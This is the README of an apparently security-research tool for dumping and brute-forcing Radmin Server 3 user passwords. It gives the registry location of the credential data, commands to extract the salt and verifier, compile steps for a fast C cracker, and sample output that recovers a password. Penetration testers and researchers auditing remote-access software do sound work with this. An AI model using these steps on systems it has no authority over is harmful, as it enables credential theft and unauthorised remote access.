# Radmin Server 3 Dumper/Cracker

For more context about this tool, see https://www.synacktiv.com/publications/cracking-radmin-server-3-passwords.html !

## How to use :

Step 1 : Recover Radmin Server 3 user information from `HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Radmin\v3.0\Server\Parameters\Radmin Security`. There might be several registry keys here, one for each user. Export them using the "export" option from the right-click menu of `regedit.exe`. Save each one in a different file.

Step 2 : Run `python3 hash_dumper.py regkey.txt` on the key you want to extract data from. You can supply a wordlist directly using `--wordlist ./test.txt` if you want to bruteforce the password, but this will be very slow.

```bash
$ python3 hash_dumper.py regkey.txt
Username : b'jonathan'
Modulus : 9847fc7e0f891dfd5d02f19d587d8f77aec0b980d4304b0113b406f23e2cec58cafca04a53e36fb68e0c3bff92cf335786b0dbe60dfe4178ef2fcd2a4dd09947ffd8df96fd0f9e2981a32da95503342eca9f08062cbdd4ac2d7cdf810db4db96db70102266261cd3f8bdd56a102fc6ceedbba5eae99e6127bdd952f7a0d18a79021c881ae63ec4b3590387f548598f2cb8f90dea36fc4f80c5473fdb6b0c6bdb0fdbaf4601f560dd149167ea125db8ad34fd0fd45350dec72cfb3b528ba2332d6091acea89dfd06c9c4d18f697245bd2ac9278b92bfe7dbafaa0c43b40a71f1930ebc4fd24c9e5a2e5a4ccf5d7f51544d70b2bca4af5b8d37b379fd7740a682f
Generator : 05
Salt : 16257c8778bc06b36d358a2158eb2689f484d0a25742050c5badef0af3a6d283
Verifier : 1aea28ecfa04940964396bfdb2f3e2021c761982d198baabe7668fdf661be1b03653bd2a69241710f1cc492cf7f47a453ea6c0c7dfb25327e2c07ba9b5c68130eeff5b15c5df1d87f4a3d9675a6ff19430eab76fffb16855b58372d8d5cfbf422a67d304e5586017b89e52c9176664eb61fed2a4d43ca4d9fc33cd7e8ab015764e6a3894afadebf987db36e1b0487b83598602b49c91e26b51ccd89c719cf9644f89fae5a69f7b4dc73ac5e8b7ebf1e02e7c497359207f241431fc257c5c995699a4ccb626d015859a7027aafdf008044ec70521def1d59c43dde0644777dc51bb39175920a0f6040d9167f68569573b70390c729ad430d66e779ab81cb1a88a
```

Step 3 : For a faster password bruteforce, paste the username, salt and verifier extracted by the python script into the constants of the `radmin3_bf.c` file. Compile the file with `g++ -o radmin3_bf -O3 radmin3_bf.c -lssl -lcrypto -lpthread`.

Step 4 : Run the binary with a wordlist file name as first argument : `./radmin3_bf ./test.txt`.

```bash
$ ./radmin3_bf test.txt 
Building big cache 1 / 10...
Building big cache 2 / 10...
Building big cache 3 / 10...
Building big cache 4 / 10...
Building big cache 5 / 10...
Building big cache 6 / 10...
Building big cache 7 / 10...
Building big cache 8 / 10...
Building big cache 9 / 10...
Building big cache 10 / 10...

Found ! bonjour0

took 0 ms
```
